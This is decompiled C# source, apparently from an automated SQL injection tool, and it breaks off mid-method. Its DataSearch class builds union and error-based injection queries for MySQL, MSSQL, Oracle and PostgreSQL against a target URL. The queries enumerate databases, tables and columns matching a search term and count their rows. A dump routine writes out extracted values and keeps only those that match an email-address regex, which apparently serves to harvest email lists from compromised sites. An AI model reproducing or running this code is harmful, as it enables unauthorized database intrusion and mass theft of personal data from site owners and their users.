using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

// Token: 0x02000104 RID: 260
public class DataSearch
{
	// Token: 0x0600112D RID: 4397 RVA: 0x00077DEC File Offset: 0x00075FEC
	public DataSearch(string url, Analyzer a, bool IsDumper)
	{
		this.stopwatch_0 = Stopwatch.StartNew();
		this.string_0 = url;
		this.analyzer_0 = a;
		this.bool_0 = IsDumper;
		if (this.bool_0)
		{
			this.int_0 = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.DumperForm.numMaxRetry));
			this.int_1 = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.DumperForm.numSleep));
		}
		else
		{
			this.int_0 = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numHTTPRetry));
			this.int_1 = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numExploitingDelay));
		}
	}

	// Token: 0x1700054B RID: 1355
	// (get) Token: 0x0600112E RID: 4398 RVA: 0x00009234 File Offset: 0x00007434
	// (set) Token: 0x0600112F RID: 4399 RVA: 0x0000923C File Offset: 0x0000743C
	public bool RetyFailed { get; set; }

	// Token: 0x1700054C RID: 1356
	// (get) Token: 0x06001130 RID: 4400 RVA: 0x00009245 File Offset: 0x00007445
	// (set) Token: 0x06001131 RID: 4401 RVA: 0x0000924D File Offset: 0x0000744D
	public int RowsCount { get; set; }

	// Token: 0x1700054D RID: 1357
	// (get) Token: 0x06001132 RID: 4402 RVA: 0x00009256 File Offset: 0x00007456
	// (set) Token: 0x06001133 RID: 4403 RVA: 0x0000925E File Offset: 0x0000745E
	public List<string> Result { get; set; }

	// Token: 0x1700054E RID: 1358
	// (get) Token: 0x06001134 RID: 4404 RVA: 0x00009267 File Offset: 0x00007467
	// (set) Token: 0x06001135 RID: 4405 RVA: 0x0000926F File Offset: 0x0000746F
	public bool CurrentDB { get; set; }

	// Token: 0x14000014 RID: 20
	// (add) Token: 0x06001136 RID: 4406 RVA: 0x00077E9C File Offset: 0x0007609C
	// (remove) Token: 0x06001137 RID: 4407 RVA: 0x00077ED4 File Offset: 0x000760D4
	public event DataSearch.OnDataChangedEventHandler OnDataChanged
	{
		[CompilerGenerated]
		add
		{
			DataSearch.OnDataChangedEventHandler onDataChangedEventHandler = this.onDataChangedEventHandler_0;
			DataSearch.OnDataChangedEventHandler onDataChangedEventHandler2;
			do
			{
				onDataChangedEventHandler2 = onDataChangedEventHandler;
				DataSearch.OnDataChangedEventHandler value2 = (DataSearch.OnDataChangedEventHandler)Delegate.Combine(onDataChangedEventHandler2, value);
				onDataChangedEventHandler = Interlocked.CompareExchange<DataSearch.OnDataChangedEventHandler>(ref this.onDataChangedEventHandler_0, value2, onDataChangedEventHandler2);
			}
			while (onDataChangedEventHandler != onDataChangedEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			DataSearch.OnDataChangedEventHandler onDataChangedEventHandler = this.onDataChangedEventHandler_0;
			DataSearch.OnDataChangedEventHandler onDataChangedEventHandler2;
			do
			{
				onDataChangedEventHandler2 = onDataChangedEventHandler;
				DataSearch.OnDataChangedEventHandler value2 = (DataSearch.OnDataChangedEventHandler)Delegate.Remove(onDataChangedEventHandler2, value);
				onDataChangedEventHandler = Interlocked.CompareExchange<DataSearch.OnDataChangedEventHandler>(ref this.onDataChangedEventHandler_0, value2, onDataChangedEventHandler2);
			}
			while (onDataChangedEventHandler != onDataChangedEventHandler2);
		}
	}

	// Token: 0x14000015 RID: 21
	// (add) Token: 0x06001138 RID: 4408 RVA: 0x00077F0C File Offset: 0x0007610C
	// (remove) Token: 0x06001139 RID: 4409 RVA: 0x00077F44 File Offset: 0x00076144
	public event DataSearch.OnCompleteEventHandler OnComplete
	{
		[CompilerGenerated]
		add
		{
			DataSearch.OnCompleteEventHandler onCompleteEventHandler = this.onCompleteEventHandler_0;
			DataSearch.OnCompleteEventHandler onCompleteEventHandler2;
			do
			{
				onCompleteEventHandler2 = onCompleteEventHandler;
				DataSearch.OnCompleteEventHandler value2 = (DataSearch.OnCompleteEventHandler)Delegate.Combine(onCompleteEventHandler2, value);
				onCompleteEventHandler = Interlocked.CompareExchange<DataSearch.OnCompleteEventHandler>(ref this.onCompleteEventHandler_0, value2, onCompleteEventHandler2);
			}
			while (onCompleteEventHandler != onCompleteEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			DataSearch.OnCompleteEventHandler onCompleteEventHandler = this.onCompleteEventHandler_0;
			DataSearch.OnCompleteEventHandler onCompleteEventHandler2;
			do
			{
				onCompleteEventHandler2 = onCompleteEventHandler;
				DataSearch.OnCompleteEventHandler value2 = (DataSearch.OnCompleteEventHandler)Delegate.Remove(onCompleteEventHandler2, value);
				onCompleteEventHandler = Interlocked.CompareExchange<DataSearch.OnCompleteEventHandler>(ref this.onCompleteEventHandler_0, value2, onCompleteEventHandler2);
			}
			while (onCompleteEventHandler != onCompleteEventHandler2);
		}
	}

	// Token: 0x14000016 RID: 22
	// (add) Token: 0x0600113A RID: 4410 RVA: 0x00077F7C File Offset: 0x0007617C
	// (remove) Token: 0x0600113B RID: 4411 RVA: 0x00077FB4 File Offset: 0x000761B4
	public event DataSearch.OnProgressEventHandler OnProgress
	{
		[CompilerGenerated]
		add
		{
			DataSearch.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
			DataSearch.OnProgressEventHandler onProgressEventHandler2;
			do
			{
				onProgressEventHandler2 = onProgressEventHandler;
				DataSearch.OnProgressEventHandler value2 = (DataSearch.OnProgressEventHandler)Delegate.Combine(onProgressEventHandler2, value);
				onProgressEventHandler = Interlocked.CompareExchange<DataSearch.OnProgressEventHandler>(ref this.onProgressEventHandler_0, value2, onProgressEventHandler2);
			}
			while (onProgressEventHandler != onProgressEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			DataSearch.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
			DataSearch.OnProgressEventHandler onProgressEventHandler2;
			do
			{
				onProgressEventHandler2 = onProgressEventHandler;
				DataSearch.OnProgressEventHandler value2 = (DataSearch.OnProgressEventHandler)Delegate.Remove(onProgressEventHandler2, value);
				onProgressEventHandler = Interlocked.CompareExchange<DataSearch.OnProgressEventHandler>(ref this.onProgressEventHandler_0, value2, onProgressEventHandler2);
			}
			while (onProgressEventHandler != onProgressEventHandler2);
		}
	}

	// Token: 0x0600113C RID: 4412 RVA: 0x00077FEC File Offset: 0x000761EC
	private void method_0(int int_3, int int_4, string string_1)
	{
		int num = checked((int)Math.Round(Math.Round((double)(100 * int_3) / (double)int_4)));
		if (this.bool_0)
		{
			global::Globals.GMain.DumperForm.method_4(Conversions.ToString(num));
			global::Globals.GMain.DumperForm.UpDateStatus(string.Concat(new string[]
			{
				"[",
				global::Globals.FormatNumbers(int_3, true),
				" | ",
				global::Globals.FormatNumbers(int_4, false),
				"] ",
				Conversions.ToString(num),
				"% ",
				global::Globals.translate_0.GetStr(global::Globals.GMain, 22, ""),
				", ",
				global::Globals.translate_0.GetStr("SearchColumn", "mnuRowsCount", ""),
				" ",
				global::Globals.FormatNumbers(this.RowsCount, false)
			}), false);
		}
		else
		{
			DataSearch.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
			if (onProgressEventHandler != null)
			{
				onProgressEventHandler(num, string.Concat(new string[]
				{
					"[",
					global::Globals.FormatNumbers(int_3, false),
					" | ",
					global::Globals.FormatNumbers(int_4, false),
					"] ",
					Conversions.ToString(num),
					"% ",
					global::Globals.translate_0.GetStr(global::Globals.GMain, 22, ""),
					", ",
					global::Globals.translate_0.GetStr("SearchColumn", "mnuRowsCount", ""),
					" ",
					global::Globals.FormatNumbers(this.RowsCount, false)
				}));
			}
		}
	}

	// Token: 0x0600113D RID: 4413 RVA: 0x00078198 File Offset: 0x00076398
	public long SearchColumn(string sSearch)
	{
		checked
		{
			try
			{
				List<string> list = new List<string>();
				List<string> list2 = new List<string>();
				List<string> list3 = new List<string>();
				List<string> list4 = new List<string>();
				List<string> list5 = new List<string>();
				this.Result = new List<string>();
				this.RowsCount = 0;
				switch (this.analyzer_0.DBType)
				{
				case Types.MySQL_No_Error:
				case Types.MySQL_With_Error:
					if (!this.analyzer_0.Version.StartsWith("4"))
					{
						list3.AddRange(new string[]
						{
							"d.schema_name",
							"t.table_name"
						});
						string text = string.Concat(new string[]
						{
							"from information_schema.schemata as d join information_schema.tables as t on t.table_schema=d.schema_name join information_schema.columns as c on c.table_schema=d.schema_name and c.table_name=t.table_name where not c.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) ",
							this.CurrentDB ? "and d.schema_name=database() " : " ",
							"and lower(c.column_name) like ",
							Class23.smethod_20("%" + sSearch.ToLower() + "%"),
							" # "
						});
						int num = this.method_1(this.string_0, "*", text.Replace("#", ""));
						text += " limit [x],[y]";
						if (num > 0)
						{
							if (this.analyzer_0.DBType == Types.MySQL_No_Error)
							{
								text = text.Replace("#", "");
								while (!this.method_6())
								{
									int num2;
									string string_ = MySQLNoError.Dump(this.string_0, this.analyzer_0.MySQLCollactions, false, false, "", "", list3, num2, 1, "", "", "", text);
									string string_2 = this.method_8(string_);
									list5 = this.method_2(string_2);
									if (list5.Count == 0)
									{
										int num3;
										num3++;
										if (num3 > this.int_0)
										{
											this.RetyFailed = true;
											break;
										}
									}
									else
									{
										int num3 = 0;
										if (!list4.Contains(list5[0] + "." + list5[1]))
										{
											list4.Add(list5[0] + "." + list5[1]);
											this.method_3(list5[0], list5[1]);
										}
										num2++;
										this.method_0(num2, num, sSearch);
										if (num2 >= num)
										{
											break;
										}
									}
								}
							}
							else if (this.analyzer_0.DBType == Types.MySQL_With_Error)
							{
								list2 = new List<string>();
								string text2 = text;
								string text3 = "";
								for (;;)
								{
									IL_50F:
									if (list2.Count > 0)
									{
										string text4 = " and not t.table_name in (";
										int num4 = list2.Count - 1;
										for (int i = 0; i <= num4; i++)
										{
											if (i != 0)
											{
												text4 += ",";
											}
											text4 += Class23.smethod_20(list2[i]);
										}
										text4 += ")";
										text = text2.Replace("#", text4).ToLower();
									}
									else
									{
										text = text2.Replace("#", "").ToLower();
									}
									text = text.Replace("  ", " ");
									int num5 = 0;
									list5.Clear();
									while (!this.method_6())
									{
										list3.Clear();
										switch (num5)
										{
										case 0:
											list3.Add("d.schema_name");
											if (this.CurrentDB & !string.IsNullOrEmpty(text3) & num5 == 0)
											{
												list5.Add(text3);
												num5++;
												continue;
											}
											goto IL_33D;
										case 1:
											list3.Add("t.table_name");
											goto IL_33D;
										case 2:
											if (list5.Count > 0)
											{
												if (list4.Contains(list5[0] + "." + list5[1]))
												{
													list5.Clear();
												}
												else
												{
													list4.Add(list5[0] + "." + list5[1]);
													this.method_3(list5[0], list5[1]);
													list2.Add(list5[1]);
												}
											}
											break;
										default:
											goto IL_33D;
										}
										IL_479:
										int num2;
										num2++;
										this.method_0(num2, num, sSearch);
										if (num2 >= num)
										{
											goto Block_21;
										}
										goto IL_50F;
										IL_33D:
										string string_ = MySQLWithError.Dump(this.string_0, this.analyzer_0.MySQLCollactions, this.analyzer_0.MySQLErrorType, false, "", "", list3, num2, 1, "", "", "", text);
										string string_2 = this.method_8(string_);
										List<string> list6 = this.method_2(string_2);
										if (list6.Count == 0)
										{
											int num3;
											num3++;
											if (num3 > this.int_0)
											{
												this.RetyFailed = true;
												break;
											}
										}
										else
										{
											if (this.CurrentDB & num5 == 0)
											{
												text3 = list6[0];
											}
											list5.Add(list6[0]);
											int num3 = 0;
											num5++;
										}
									}
									goto IL_479;
								}
								Block_21:;
							}
						}
					}
					break;
				case Types.MSSQL_No_Error:
				case Types.MSSQL_With_Error:
					while (!this.method_6())
					{
						list3.Clear();
						int num2;
						if (num2 == 0)
						{
							list3.Add("DB_NAME()");
						}
						else
						{
							if (this.CurrentDB || list.Count == 0)
							{
								break;
							}
							list3.Add("DB_NAME(" + Conversions.ToString(num2) + ")");
						}
						string string_ = MSSQL.Info(this.string_0, (InjectionType)Conversions.ToInteger(Interaction.IIf(this.analyzer_0.DBType == Types.MSSQL_No_Error, InjectionType.Union, InjectionType.Error)), this.analyzer_0.MSSQLCollate, list3, this.analyzer_0.MSSQLCast, "");
						string string_2 = this.method_8(string_);
						List<string> list7 = this.method_2(string_2);
						int num3;
						if (list7.Count == 0 & (!this.CurrentDB & num2 == 0))
						{
							num3++;
							if (num3 <= this.int_0)
							{
								continue;
							}
							this.RetyFailed = true;
						}
						else if (list7.Count != 0)
						{
							list.Add(list7[0]);
							num3 = 0;
							num2++;
							continue;
						}
						IL_639:
						num3 = 0;
						num2 = 0;
						if (list.Count == 0)
						{
							goto IL_D1D;
						}
						do
						{
							string text5 = list[num2].ToLower();
							bool flag;
							if ((flag = true) == text5.Equals("master") || flag == text5.Equals("model") || flag == text5.Equals("msdb") || flag == text5.Equals("tempdb") || flag == text5.Contains("$sqlexpress"))
							{
								list.RemoveAt(num2);
							}
							num2++;
						}
						while (num2 < list.Count - 1);
						num2 = 0;
						IL_8A0:
						while (!this.method_6())
						{
							if (num2 > list.Count - 1)
							{
								break;
							}
							string text6 = list[num2];
							string text = "select cast(count(t.name) as char) as x from [" + text6 + "]..[sysobjects] t join [syscolumns] as c on t.id=c.id where t.xtype=char(85) and lower(c.name) like " + Class23.smethod_21("%" + sSearch.ToLower() + "%", false, "+", "char");
							int num = this.method_1(this.string_0, "*", text);
							if (num != 0)
							{
								text = string.Concat(new string[]
								{
									"select top 1 x from ( select distinct top [x] (t.name) as x from [",
									text6,
									"]..[sysobjects] t join [syscolumns] as c on t.id=c.id where t.xtype=char(85) and lower(c.name) like ",
									Class23.smethod_21("%" + sSearch.ToLower() + "%", false, "+", "char"),
									" order by x asc) sq order by x desc"
								});
								int num6 = 0;
								while (!this.method_6())
								{
									string_ = MSSQL.Dump(this.string_0, "", "", null, false, (InjectionType)Conversions.ToInteger(Interaction.IIf(this.analyzer_0.DBType == Types.MSSQL_No_Error, InjectionType.Union, InjectionType.Error)), this.analyzer_0.MSSQLCast, this.analyzer_0.MSSQLCollate, num6, 0, "", "", "", text, -1);
									string_2 = this.method_8(string_);
									list5 = this.method_2(string_2);
									if (list5.Count == 0)
									{
										num3++;
										if (num3 <= this.int_0)
										{
											continue;
										}
										this.RetyFailed = true;
									}
									else
									{
										this.method_3(text6, list5[0]);
										num3 = 0;
										num6++;
										this.method_0(num2 + 1, list.Count, sSearch);
										if (num6 <= num)
										{
											continue;
										}
									}
									IL_89A:
									num2++;
									goto IL_8A0;
								}
								goto IL_89A;
							}
							num2++;
						}
						goto IL_D1D;
					}
					goto IL_639;
				case Types.Oracle_No_Error:
				case Types.Oracle_With_Error:
				{
					string text7;
					if (this.CurrentDB)
					{
						list5 = this.analyzer_0.GetInfo(this.string_0, "(select name from v$database)");
						if (list5.Count <= 0)
						{
							break;
						}
						text7 = list5[0];
					}
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
					{
						"# from (select rownum r, owner as d, table_name as t from all_tab_columns where lower(column_name) like ",
						Class23.smethod_21("%" + sSearch.ToLower() + "%", false, "||", "chr"),
						" and column_name not in (",
						Class23.smethod_21("SYS", false, "||", "chr"),
						", ",
						Class23.smethod_21("OUTLN", false, "||", "chr"),
						", ",
						Class23.smethod_21("SYSTEM", false, "||", "chr"),
						", ",
						Class23.smethod_21("WMSYS", false, "||", "chr"),
						", ",
						Class23.smethod_21("ORDSYS", false, "||", "chr"),
						", ",
						Class23.smethod_21("MDSYS", false, "||", "chr"),
						")"
					}), Interaction.IIf(this.CurrentDB, "and owner=" + Class23.smethod_21(text7, false, "||", "chr"), "")), ")"));
					int num = this.method_1(this.string_0, "*", text.Replace("#", "select count(*)"));
					if (num != 0)
					{
						text = text.Replace("#", "select d [s] t") + " where r = [x]";
						while (!this.method_6())
						{
							int num2;
							string string_ = Oracle.Dump(this.string_0, (InjectionType)Conversions.ToInteger(Interaction.IIf(this.analyzer_0.DBType == Types.Oracle_No_Error, InjectionType.Union, InjectionType.Error)), this.analyzer_0.OracleErrorType, "", "", list3, this.analyzer_0.OracleCast, OracleTopN.ROWNUM, num2, "", "", "", text);
							string string_2 = this.method_8(string_);
							list5 = this.method_2(string_2);
							if (list5.Count == 0)
							{
								int num3;
								num3++;
								if (num3 > this.int_0)
								{
									this.RetyFailed = true;
									break;
								}
							}
							else
							{
								this.method_3(list5[0], list5[1]);
								int num3 = 0;
								num2++;
								this.method_0(num2, num, sSearch);
								if (num2 > num)
								{
									break;
								}
							}
						}
					}
					break;
				}
				case Types.PostgreSQL_No_Error:
				case Types.PostgreSQL_With_Error:
				{
					string text = string.Concat(new string[]
					{
						"select distinct current_database() [s] relname from pg_class c, pg_namespace n, pg_attribute a, pg_type t where (c.relkind=",
						Class23.smethod_21("r", false, "||", "chr"),
						") and (n.oid=c.relnamespace) and (a.attrelid=c.oid) and (a.atttypid=t.oid) and (a.attnum>0) and (not a.attisdropped) and (n.nspname like ",
						Class23.smethod_21("public", false, "||", "chr"),
						") and (lower(attname) like ",
						Class23.smethod_21("%" + sSearch.ToLower() + "%", false, "||", "chr"),
						")"
					});
					int num = this.method_1(this.string_0, "*", "select count(*) from (" + text + ") as t");
					text += " limit 1 offset [x]";
					if (num != 0)
					{
						while (!this.method_6())
						{
							int num2;
							string string_ = PostgreSQL.Dump(this.string_0, (InjectionType)Conversions.ToInteger(Interaction.IIf(this.analyzer_0.DBType == Types.PostgreSQL_No_Error, InjectionType.Union, InjectionType.Error)), "", "", list3, this.analyzer_0.PostgreSQLErrorType, num2, "", "", "", "(" + text + ")");
							string string_2 = this.method_8(string_);
							list5 = this.method_2(string_2);
							if (list5.Count == 0)
							{
								int num3;
								num3++;
								if (num3 > this.int_0)
								{
									this.RetyFailed = true;
									break;
								}
							}
							else
							{
								this.method_3(list5[0], list5[1]);
								int num3 = 0;
								num2++;
								this.method_0(num2, num, sSearch);
								if (num2 > num)
								{
									break;
								}
							}
						}
					}
					break;
				}
				}
				IL_D1D:;
			}
			catch (Exception ex)
			{
				Interaction.MsgBox(ex.ToString(), MsgBoxStyle.OkOnly, null);
			}
			finally
			{
				DataSearch.OnCompleteEventHandler onCompleteEventHandler = this.onCompleteEventHandler_0;
				if (onCompleteEventHandler != null)
				{
					onCompleteEventHandler();
				}
			}
		}
		return (long)this.RowsCount;
	}

	// Token: 0x0600113E RID: 4414 RVA: 0x00078F38 File Offset: 0x00077138
	private int method_1(string string_1, string string_2, string string_3)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list.Add("count(" + string_2 + ")");
		string string_4;
		switch (this.analyzer_0.DBType)
		{
		case Types.MySQL_No_Error:
			string_4 = MySQLNoError.Dump(string_1, this.analyzer_0.MySQLCollactions, false, false, "", "", list, 0, 1, "", "", "", string_3);
			break;
		case Types.MySQL_With_Error:
			string_4 = MySQLWithError.Dump(string_1, this.analyzer_0.MySQLCollactions, this.analyzer_0.MySQLErrorType, false, "", "", list, 0, 1, "", "", "", string_3);
			break;
		case Types.MSSQL_No_Error:
			string_4 = MSSQL.Dump(string_1, "", "", list, false, InjectionType.Union, this.analyzer_0.MSSQLCast, this.analyzer_0.MSSQLCollate, 0, 0, "", "", "", string_3, -1);
			break;
		case Types.MSSQL_With_Error:
			string_4 = MSSQL.Dump(string_1, "", "", list, false, InjectionType.Error, this.analyzer_0.MSSQLCast, this.analyzer_0.MSSQLCollate, 0, 0, "", "", "", string_3, -1);
			break;
		case Types.Oracle_No_Error:
			string_4 = Oracle.Dump(string_1, InjectionType.Union, this.analyzer_0.OracleErrorType, "", "", list, false, OracleTopN.ROWNUM, 0, "", "", "", string_3);
			break;
		case Types.Oracle_With_Error:
			string_4 = Oracle.Dump(string_1, InjectionType.Error, this.analyzer_0.OracleErrorType, "", "", list, false, OracleTopN.ROWNUM, 0, "", "", "", string_3);
			break;
		case Types.PostgreSQL_No_Error:
			string_4 = PostgreSQL.Dump(string_1, InjectionType.Union, "", "", list, this.analyzer_0.PostgreSQLErrorType, 0, "", "", "", "(" + string_3 + ")");
			break;
		case Types.PostgreSQL_With_Error:
			string_4 = PostgreSQL.Dump(string_1, InjectionType.Error, "", "", list, this.analyzer_0.PostgreSQLErrorType, 0, "", "", "", "(" + string_3 + ")");
			break;
		}
		int result;
		if (this.method_6())
		{
			result = 0;
		}
		else
		{
			string string_5 = this.method_8(string_4);
			list2 = this.method_2(string_5);
			if (list2.Count > 0)
			{
				if (Versioned.IsNumeric(list2[0]))
				{
					result = int.Parse(list2[0]);
				}
				else
				{
					result = 0;
				}
			}
			else
			{
				result = 0;
			}
		}
		return result;
	}

	// Token: 0x0600113F RID: 4415 RVA: 0x000791E0 File Offset: 0x000773E0
	private List<string> method_2(string string_1)
	{
		List<string> list = new List<string>();
		if (!string.IsNullOrEmpty(string_1))
		{
			list = global::Globals.GMain.DumperForm.method_17(string_1, this.analyzer_0.DBType, false);
			if (list.Count == 1)
			{
				string[] array = Strings.Split(list[0], Class54.string_2, -1, CompareMethod.Binary);
				list.Clear();
				foreach (string text in array)
				{
					list.Add(text.Replace(" ", "").Trim());
				}
			}
		}
		return list;
	}

	// Token: 0x06001140 RID: 4416 RVA: 0x00079278 File Offset: 0x00077478
	private bool method_3(string string_1, string string_2)
	{
		checked
		{
			bool result;
			if (!string.IsNullOrEmpty(string_1))
			{
				int num;
				switch (this.analyzer_0.DBType)
				{
				case Types.MSSQL_No_Error:
				case Types.MSSQL_With_Error:
					num = this.method_1(this.string_0, "*", string.Concat(new string[]
					{
						"select cast(count(*) as char) as x from [",
						string_1,
						"]..[",
						string_2,
						"]"
					}));
					goto IL_114;
				case Types.Oracle_No_Error:
				case Types.Oracle_With_Error:
					num = this.method_1(this.string_0, "*", "select count (*) from " + string_1 + "." + string_2);
					goto IL_114;
				case Types.PostgreSQL_No_Error:
				case Types.PostgreSQL_With_Error:
					num = this.method_1(this.string_0, "*", "select count (*) from " + string_2);
					goto IL_114;
				}
				if (string.IsNullOrEmpty(string_1))
				{
					num = this.method_1(this.string_0, "*", "from " + string_2);
				}
				else
				{
					num = this.method_1(this.string_0, "*", "from " + string_1 + "." + string_2);
				}
				IL_114:
				if (num > 0)
				{
					string text;
					if (string.IsNullOrEmpty(string_1))
					{
						text = string_2;
					}
					else
					{
						text = string_1 + "." + string_2;
					}
					text = "[" + global::Globals.FormatNumbers(num, false).PadLeft(9, ' ') + "] " + text;
					if (!this.Result.Contains(text))
					{
						this.RowsCount += num;
						this.Result.Add(text);
						DataSearch.OnDataChangedEventHandler onDataChangedEventHandler = this.onDataChangedEventHandler_0;
						if (onDataChangedEventHandler != null)
						{
							onDataChangedEventHandler(text);
						}
					}
				}
				result = true;
			}
			else
			{
				result = false;
			}
			return result;
		}
	}

	// Token: 0x06001141 RID: 4417 RVA: 0x00079420 File Offset: 0x00077620
	private void method_4(string string_1, List<string> list_1)
	{
		checked
		{
			try
			{
				foreach (string text in list_1)
				{
					if (!File.Exists(string_1))
					{
						string[] array = text.Split(new char[]
						{
							'.'
						});
						List<string> list = new List<string>();
						InjectionType oError;
						string string_2;
						int num;
						string text3;
						if (this.analyzer_0.DBType == Types.MSSQL_With_Error)
						{
							if (this.analyzer_0.DBType != Types.MSSQL_No_Error)
							{
								oError = InjectionType.Error;
								string sCustomQuery = string.Concat(new string[]
								{
									"select top 1 x from ( select distinct top [x] (t.name + Char(46) + c.name) as x from [",
									array[0],
									"]..[sysobjects] t join [syscolumns] as c on t.id = c.id where t.xtype = char(85) and c.name like ",
									Class23.smethod_21("%id%", false, "+", "char"),
									" order by x asc) sq order by x desc"
								});
								for (;;)
								{
									string_2 = MSSQL.Dump(this.string_0, "", "", null, false, oError, "char", this.analyzer_0.MSSQLCollate, 0, 0, "", "", "", sCustomQuery, -1);
									string text2 = this.method_8(string_2);
									if (string.IsNullOrEmpty(text2))
									{
										num++;
										if (num > this.int_0)
										{
											goto IL_142;
										}
									}
									else
									{
										num = 0;
										list = this.method_2(text2);
										if (list.Count != 0)
										{
											goto IL_154;
										}
										num++;
										if (num > this.int_0)
										{
											goto Block_6;
										}
									}
								}
								IL_16E:
								if (!string.IsNullOrEmpty(text3))
								{
									goto IL_17A;
								}
								continue;
								IL_142:
								this.RetyFailed = true;
								goto IL_16E;
								Block_6:
								this.RetyFailed = true;
								goto IL_16E;
								IL_154:
								num = 0;
								text3 = Strings.Split(list[0], Class54.string_2, -1, CompareMethod.Binary)[0];
								goto IL_16E;
							}
							oError = InjectionType.Union;
						}
						IL_17A:
						try
						{
							StreamWriter streamWriter = new StreamWriter(string_1);
							list = new List<string>();
							list.Add(array[2]);
							if (this.analyzer_0.DBType == Types.MSSQL_With_Error)
							{
								list.Add(text3);
							}
							int num3;
							int num2 = num3 - 1;
							for (int i = 0; i <= num2; i++)
							{
								switch (this.analyzer_0.DBType)
								{
								case Types.MySQL_No_Error:
									string_2 = MySQLNoError.Dump(this.string_0, this.analyzer_0.MySQLCollactions, false, false, array[0], array[1], list, i, 1, "", "", "", "");
									break;
								case Types.MySQL_With_Error:
									string_2 = MySQLWithError.Dump(this.string_0, this.analyzer_0.MySQLCollactions, this.analyzer_0.MySQLErrorType, false, array[0], array[1], list, i, 1, "", "", "", "");
									break;
								case Types.MSSQL_No_Error:
								case Types.MSSQL_With_Error:
									string_2 = MSSQL.Dump(this.string_0, Conversions.ToString(Interaction.IIf(this.CurrentDB, "", array[0])), array[1], list, true, oError, this.analyzer_0.MSSQLCast, this.analyzer_0.MSSQLCollate, i, num3, list[0] + " like 0x254025", "", "", "", -1);
									break;
								}
								if (this.method_6())
								{
									break;
								}
								string text2 = this.method_8(string_2);
								if (string.IsNullOrEmpty(text2))
								{
									if (num >= this.int_0)
									{
										break;
									}
								}
								else
								{
									num = 0;
								}
								if (!string.IsNullOrEmpty(text2))
								{
									list = global::Globals.GMain.DumperForm.method_17(text2, this.analyzer_0.DBType, false);
									if (list.Count > 0)
									{
										text2 = Strings.Split(list[0], Class54.string_2, -1, CompareMethod.Binary)[0];
										if (this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init == null)
										{
											Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init, new StaticLocalInitFlag(), null);
										}
										bool flag = false;
										try
										{
											Monitor.Enter(this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init, ref flag);
											if (this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init.State == 0)
											{
												this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init.State = 2;
												this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks = 0;
											}
											else if (this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init.State == 2)
											{
												throw new IncompleteInitialization();
											}
										}
										finally
										{
											this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init.State = 1;
											if (flag)
											{
												Monitor.Exit(this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init);
											}
										}
										if (this.method_5(text2))
										{
											streamWriter.WriteLine(text2);
											if (i % 10 == 0)
											{
												streamWriter.Flush();
											}
											this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks = 0;
										}
										else
										{
											this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks++;
											if (this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks > 20)
											{
												this.$STATIC$DumpToFile$2021E151280A11E$MaxBlacks = 0;
												goto IL_43B;
											}
										}
										num = 0;
									}
									else
									{
										num++;
									}
								}
								IL_43B:;
							}
						}
						catch (Exception ex)
						{
							Interaction.MsgBox(this.string_0 + "\r\n\r\n" + ex.StackTrace, MsgBoxStyle.OkOnly, null);
							Clipboard.SetText(this.string_0);
						}
						finally
						{
						}
					}
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}
	}

	// Token: 0x06001142 RID: 4418 RVA: 0x00079938 File Offset: 0x00077B38
	private bool method_5(string string_1)
	{
		bool result;
		try
		{
			Match match = Regex.Match(string_1.Trim(), "^[a-zA-Z][\\w\\.-]*[a-zA-Z0-9]@[a-zA-Z0-9][\\w\\.-]*[a-zA-Z0-9]\\.[a-zA-Z][a-zA-Z\\.]*[a-zA-Z]$");
			result = match.Success;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06001143 RID: 4419 RVA: 0x00079984 File Offset: 0x00077B84
	private bool method_6()
	{
		if (this.bool_0)
		{
			if (global::Globals.GMain.DumperForm.WorkedRequestStop())
			{
				return true;
			}
		}
		else if (global::Globals.GMain.method_23())
		{
			return true;
		}
		return this.RetyFailed;
	}

	// Token: 0x06001144 RID: 4420 RVA: 0x000799C8 File Offset: 0x00077BC8
	private void method_7()
	{
		while (!this.RetyFailed && this.stopwatch_0.Elapsed.TotalMilliseconds <= (double)this.int_1)
		{
			if (this.bool_0)
			{
				if (global::Globals.GMain.DumperForm.WorkedRequestStop())
				{
					break;
				}
			}
			else if (global::Globals.GMain.method_23())
			{
				break;
			}
			Thread.Sleep(100);
			Application.DoEvents();
		}
	}

	// Token: 0x06001145 RID: 4421 RVA: 0x00079A34 File Offset: 0x00077C34
	private string method_8(string string_1)
	{
		if (Conversions.ToBoolean(global::Globals.GetObjectValue(global::Globals.GMain.chkAnalizeWAF)))
		{
			string_1 = Class23.smethod_15(string_1);
		}
		if (this.bool_0)
		{
